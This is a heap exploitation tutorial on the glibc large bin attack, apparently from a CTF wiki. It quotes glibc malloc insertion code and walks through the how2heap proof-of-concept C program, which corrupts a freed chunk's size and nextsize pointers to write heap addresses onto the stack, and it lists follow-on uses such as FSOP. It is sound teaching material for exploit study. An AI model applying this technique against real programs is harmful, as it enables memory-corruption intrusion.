# Large Bin Attack

Allocating chunks related to large bins goes through fastbin, unsorted bin, and small bin allocation first. It is recommended to understand the allocation flow of fastbin and unsorted bin before studying the large bin attack.

## large bin attack

This attack technique mainly exploits the operation of inserting a chunk into a bin. During `malloc`, when traversing the unsorted bin, for each chunk, if it cannot be allocated via exact-fit or does not meet the conditions for split allocation, it will be placed into the corresponding bin. This process lacks validation of the large bin's skip list pointers.

Taking glibc version 2.33 as an example, starting from line 4052 is the operation for inserting a large bin chunk into its bin:

```cpp
else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;

              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert (chunk_main_arena (bck->bk));
                  if ((unsigned long) (size)
		      < (unsigned long) chunksize_nomask (bck->bk))
                    {
                      fwd = bck;
                      bck = bck->bk;

                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
                  else
                    {
                      assert (chunk_main_arena (fwd));
                      while ((unsigned long) size < chunksize_nomask (fwd))
                        {
                          fwd = fwd->fd_nextsize;
			  assert (chunk_main_arena (fwd));
                        }

                      if ((unsigned long) size
			  == (unsigned long) chunksize_nomask (fwd))
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
                            malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                      if (bck->fd != fwd)
                        malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
                    }
                }
```

In versions 2.29 and below, depending on the size of the unsorted chunk:

```cpp
fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
victim->bk_nextsize->fd_nextsize = victim;
```

When the unsorted chunk is smaller than the smallest chunk in the linked list, the first statement is executed; otherwise, the second statement is executed.

Since when the two sizes are equal, only the following insertion method is used, exploitation is not possible in this case:

```cpp
if ((unsigned long) size
			  == (unsigned long) chunksize_nomask (fwd))
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
```

Therefore, there are two exploitation methods.

In version 2.30, an integrity check for the large bin skip list was added, which invalidates exploitation when the unsorted chunk is larger than the smallest chunk in the linked list. The unsorted chunk must be smaller than the smallest chunk in the linked list, and exploitation is achieved through:

```cpp
victim->bk_nextsize->fd_nextsize = victim;
```

This effectively writes the address of the current chunk to `bk_nextsize + 0x20`.

## Learning Large Bin Attack Through an Example

Here we use the source code from the large bin attack example in how2heap for analysis:

```c
// The main vulnerability is here
/*

    This technique is taken from
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/

    [...]

              else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;

    [...]

    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;

    For more details on how large-bins are handled and sorted by ptmalloc,
    please check the Background section in the aforementioned link.

    [...]

 */

// gcc large_bin_attack.c -o large_bin_attack -g
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
    fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
                    "global variable global_max_fast in libc for further fastbin attack\n\n");

    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:\n");
    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);

    unsigned long *p1 = malloc(0x320);
    fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
                    " the first large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p2 = malloc(0x400);
    fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
                    " the second large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p3 = malloc(0x400);
    fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
                    " the third large chunk during the free()\n\n");
    malloc(0x20);

    free(p1);
    free(p2);
    fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
                    " [ %p <--> %p ]\n\n",
            (void *)(p2 - 2), (void *)(p2[0]));

    void* p4 = malloc(0x90);
    fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
                    " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
                    ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
                    " [ %p ]\n\n",
            (void *)((char *)p1 + 0x90));

    free(p3);
    fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
                    " [ %p <--> %p ]\n\n",
            (void *)(p3 - 2), (void *)(p3[0]));

    //------------VULNERABILITY-----------

    fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
                    " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
    fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
                    " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
                    " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");

    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);

    //------------------------------------

    malloc(0x90);

    fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
                    " During this time, targets should have already been rewritten:\n");

    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);

    return 0;
}

```



After compiling, note: you must use the glibc 2.25 loader. For instructions on changing the loader, see: https://www.jianshu.com/p/1a966b62b3d4





Let's fire up pwngdb and begin our analysis:



![](./figure/large_bin_attack/large_bin_attack1.png)





First, let's jump to this statement (an additional p4 variable has been added compared to the how2heap source):



![](./figure/large_bin_attack/large_bin_attack2.png)



Since we just `free()`'d two chunks, the unsorted bin now has two free chunks:



![](./figure/large_bin_attack/large_bin_attack3.png)

Note the following:



The size of p1 is `0x330 < 0x3f0`, which falls in the small bin range, while the size of p2 is `0x410`, which falls in the large bin range.



![](./figure/large_bin_attack/large_bin_attack4.png) 



Line 75 does a lot of things. Here is a summary:



+ Take the last chunk from the unsorted bin (p1 falls in the small bin range)
+ Place this chunk into the small bin and mark that this small bin sequence has a free chunk
+ Take the next last chunk from the unsorted bin (p2 falls in the large bin range)
+ Place this chunk into the large bin and mark that this large bin sequence has a free chunk
+ Now the unsorted bin is empty. Allocate a small chunk from the small bin (p1) to satisfy the 0x90 request, and put the remaining chunk (0x330 - 0xa0) back into the unsorted bin



So now:



![](./figure/large_bin_attack/large_bin_attack5.png)



The unsorted bin has one chunk with size `0x330 - 0xa0 = 0x290`.



A certain sequence in the large bin has one chunk with size `0x410`.



**OK, let's continue debugging:**



![](./figure/large_bin_attack/large_bin_attack6.png)



Another large bin chunk of size 0x410 has been freed. This means the unsorted bin now has two free chunks: at the end is the chunk of size `0x290`, and the first one is a chunk of size `0x410`.



Next, we begin the construction:



![](./figure/large_bin_attack/large_bin_attack7.png)



We modify p2 (the large bin chunk). The result of the modification is as follows:



![](./figure/large_bin_attack/large_bin_attack8.png)

Now let's see what `malloc(0x90)` does:



![](./figure/large_bin_attack/large_bin_attack9.png)





Here is a summary of the intermediate process; we will explain the key points in detail shortly:



Similar to the first `malloc(0x90)` process:



+ Take the last chunk from the unsorted bin (size = 0x290), place it into the small bin, and mark that small bin sequence as having a free chunk
+ Then take the last chunk from the unsorted bin (size = 0x410)

![](./figure/large_bin_attack/large_bin_attack10.png)



**Here comes the key point:**



Since this time we are taking a large bin chunk, execution enters the else branch:



![](./figure/large_bin_attack/large_bin_attack11.png)



Let's continue:

![](./figure/large_bin_attack/large_bin_attack12.png)



**In a sequence of large bin chunks, the fd_nextsize direction points towards decreasing sizes. This loop's purpose is to find an address of a chunk that is larger than the chunk currently pointed to by fwd, and store it in fwd.**



Since the current fwd's size has been modified by us to `0x3f0`, it does not enter the loop. There is a limitation of this vulnerability here, which we will discuss later.



![](./figure/large_bin_attack/large_bin_attack13.png)

The original intent here is to insert the chunk coming from the unsorted bin into this sequence, but there is no validity check here. This is where the exploitation lies:



The construction we did earlier made fwd's bk_nextsize point to another address:



```c
victim->bk_nextsize = fwd->bk_nextsize
// then
victim->bk_nextsize->fd_nextsize = victim;
```



Which is equivalent to:



```c
addr2->fd_nextsize = victim;
// equivalent to
*(addr2+4) = victim;
```



This is how the value of `stack_var2` gets modified.



There is also another exploitation:

```c
bck = fwd->bk;
// ......
mark_bin (av, victim_index);
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;
```





```c
bck->fd = victim;
// equivalent to
(fwd->bk)->fd = victim;
// equivalent to
*(addr1+2) = victim;
```



This modifies the value of `stack_var1`.



At this point, the exploitation is complete. Since the final allocation is still from the small bin chunk, it has nothing to do with the large bin chunk anymore.



## Summary of Large Bin Attack Exploitation Methods



As mentioned in how2heap, the large bin attack is a stepping stone for deeper exploitation. Now let's summarize the conditions for exploitation:



+ The data of a large bin chunk can be modified
+ The large bin chunk coming from the unsorted bin must be placed right after the crafted chunk
+ The large bin attack can assist a Tcache Stash Unlink+ attack
+ It can modify `_IO_list_all` to facilitate forging an `_IO_FILE` structure for FSOP
